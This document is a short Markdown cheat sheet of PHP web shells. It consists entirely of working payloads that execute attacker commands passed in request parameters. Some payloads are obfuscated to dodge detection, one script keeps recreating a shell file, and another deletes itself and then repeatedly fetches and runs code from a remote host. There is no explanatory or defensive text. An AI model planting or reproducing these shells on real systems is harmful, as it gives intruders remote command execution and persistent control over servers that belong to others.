# Webshells

```php
<?php system($_GET["cmd"]); ?>
```

```php
<?php system($_GET[1]); ?>
```

```php
<?php system("`$_GET[1]`"); ?>
```

```php
<?= system($_GET[cmd]);
```

```php
<?php eval($_POST[cmd]);?>
```

```php
<?php echo `$_GET[1]`;
```

```php
<?php echo passthru($_GET['cmd']);
```

```php
<?php echo shell_exec($_GET['cmd']);
```

```php
<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>
```

```php
<script language="php">system("id"); </script>
```

```php
<?php $_GET['a']($_GET['b']); ?>
// a=system&b=ls
// a=assert&b=system("ls")
```

```php
<?php array_map("ass\x65rt",(array)$_REQUEST['cmd']);?>
// .php?cmd=system("ls")
```

```php
<?@extract($_REQUEST);@die($f($c));?>
// .php?f=system&c=id
```

```php
<?php
    ignore_user_abort(true);
    set_time_limit(0);
    $file = 'shell.php';
    $code = '<?php eval($_POST[a]);?>';
    while(md5(file_get_contents($file)) !== md5($code)) {
        if(!file_exists($file)) {
            file_put_contents($file, $code);
        }
        usleep(50);
    }
?>
```

```php
<?php
    unlink(__FILE__);
    ignore_user_abort(true);
    set_time_limit(0);
    $remote_file = 'http://xxx/xxx.txt';
    while($code = file_get_contents($remote_file)){
        @eval($code);
        sleep(5);
    };
?>
```
